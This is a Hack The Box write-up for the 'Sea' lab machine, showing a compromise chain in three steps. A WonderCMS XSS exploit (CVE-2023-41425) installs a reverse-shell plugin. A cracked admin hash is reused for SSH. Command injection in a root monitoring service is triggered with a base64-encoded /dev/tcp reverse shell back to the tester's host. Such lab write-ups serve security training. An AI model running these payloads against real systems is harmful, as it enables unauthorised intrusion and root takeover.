---
title: "Sea"
---

# Sea

![Cap dashboard screenshot](sea.png)

Sea is an easy Linux Hack The Box machine built around a vulnerable WonderCMS instance and a second local web application running as root. The path to compromise starts with a reflected XSS exploit in the CMS login flow, continues with credential reuse, and ends with command injection in a monitoring interface.

## Reconnaissance

An initial scan showed SSH on port 22 and HTTP on port 80.

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

The web page looked like a site for a bike competition company, with only two pages: Home and How to participate.

![Cap dashboard screenshot](sea-1.png)

## Web Enumeration

The participation page tried to load `sea.htb/contact.php`, which failed until I added `sea.htb` to `/etc/hosts`.

After that, the contact form loaded correctly and accepted several fields: name, email, age, country, and an optional website. Supplying a callback URL triggered a request to my listener, which confirmed outbound HTTP connectivity.

![Cap dashboard screenshot](sea-2.png)

I also noticed that the banner image lived at:

```text
/themes/bike/img/velik71-new-logotip.png
```

Searching for that filename only returned one useful result: a forum post discussing approval of a new theme in WonderCMS. That led me to test the usual WonderCMS login URL, which turned out to be `/loginURL`.

```text
http://sea.htb/loginURL
```

The page loaded a login form, but the default password did not work.

![Cap dashboard screenshot](sea-3.png)

## Initial Access

Searching for public exploit material for WonderCMS led to `CVE-2023-41425` https://github.com/prodigiousMind/CVE-2023-41425 , a reflected XSS issue in the login flow that can be abused to make authenticated requests in the admin context. In this case, the payload is used to install a plugin that provides a reverse shell.

I reviewed the PoC and saw that it takes three arguments: the login URL, attacker IP, and listener port. It generates a JavaScript file and serves it over HTTP while providing a malicious link to send to the admin.

I downloaded the archive used by the exploit, placed it beside the script as `main.zip`, and updated the ZIP URL in the PoC to point to my local HTTP server.

```bash
python3 exploit.py http://sea.htb/wondercms/loginURL 10.10.10.10 8888
```

The script produced the XSS link and started a local HTTP server.

```text
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 8888
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/wondercms/index.php?page=loginURL?"></form><script+src="http://10.10.10.10:8000/xss.js"></script><form+action="
----------------------------

starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

After submitting the link through the contact form, the target fetched `xss.js` and then downloaded `main.zip`, confirming the exploit worked. The reverse shell did not trigger immediately, so I checked the plugin path manually.

Because the CMS stored themes under `/themes`, I removed the `/wondercms` prefix from the expected path and visited the plugin directly:

```text
http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.10.10&lport=8888
```

That connected back successfully and gave me a shell as `www-data`.

## User Escalation

### Shell as amay

The host had two additional users with login shells: `amay` and `geo`. Since WonderCMS stores its configuration locally, I checked the CMS data directory under `/var/www/sea` and found the admin hash inside `data/database.js`.

```json
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\\/D.GuE4jRIikYiWrD3TM\\/PjDnXm4q",
...
```

After removing the escape characters, I cracked the hash with `john` and `rockyou.txt`. That recovered the password `mychemicalromance`, which also worked for `amay` over SSH.

## Root Access

Besides the CMS web server, I found another service listening on port 8080. Accessing it locally returned a `401 Unauthorized` response, so I opened an SSH SOCKS proxy and retried through that tunnel.

```text
HTTP/1.0 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted Area"
X-Powered-By: PHP/7.4.3-4ubuntu2.23
```
![Cap dashboard screenshot](sea-4.png)

Using `amay`’s credentials allowed access to a System Monitor interface. It showed disk usage and offered several administrative actions such as cleaning logs and updating the system.

When I clicked **Analyze** on `access.log`, the browser submitted a POST request containing a `log_file` parameter. I copied the request and started testing file reads by replacing the value with `/etc/passwd` and `/etc/shadow`.

The output showed that the service was reading files as root, though it filtered part of the content and displayed a warning about suspicious traffic patterns.

Inspecting the running services pointed to a custom systemd service:

```text
monitoring-watchdog.service loaded active running Monitoring Service Watchdog
monitoring.service          loaded active running System Monitoring Developing
```

The service file revealed the root-owned web app location:

```ini
[Service]
User=root
Group=root
ExecStart=/usr/bin/php -S localhost:8080 -t /root/monitoring
WorkingDirectory=/root/monitoring
Restart=always
```

Reading `/root/monitoring/index.php` with the LFI itSelf :  

```bash
proxychains -q curl 'http://127.0.0.1:8080' \
                    -H 'Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==' \
                    --data-raw 'analyze_log=&log_file=/root/monitoring/index.php'
```

exposed the core vulnerability. The `log_file` value was passed directly into a `system()` call.

```php
$suspicious_traffic = system("cat $log_file | grep -i 'sql\|exec\|wget\|curl\|whoami\|system\|shell_exec\|ls\|dir'");
```

That meant command injection was possible. I appended a reverse shell payload to the parameter and received a root shell.

```bash
proxychains -q curl 'http://127.0.0.1:8080' \
  -H 'Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==' \
  --data-raw 'analyze_log=&log_file=/root/monitoring/index.php;echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNDQ0NCAwPiYx"|base64 -d|bash'
```

The listener caught the callback and confirmed root access.

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Attack Path

- Enumerate SSH and HTTP on the target.
- Identify the site as WonderCMS through content and theme artifacts.
- Discover the login URL and exploit `CVE-2023-41425`.
- Use XSS to install a reverse shell plugin.
- Recover the WonderCMS password hash from `database.js`.
- Crack the hash and log in as `amay`.
- Access the local monitoring service on port 8080 through SSH tunneling.
- Abuse file-read behavior to inspect `/root/monitoring/index.php`.
- Exploit command injection in the `log_file` parameter.
- Spawn a root shell and capture the final flag.

## Tags

`hackthebox`, `ctf`, `linux`, `easy`, `CVE-2023-41425`, `wondercms`, `xss`, `rce`, `basic-auth`, `command-injection`, `credential-reuse`, `T1078`, `T1110`, `T1190`, `T1203`, `T1204`, `T1204.001`, `T1552`
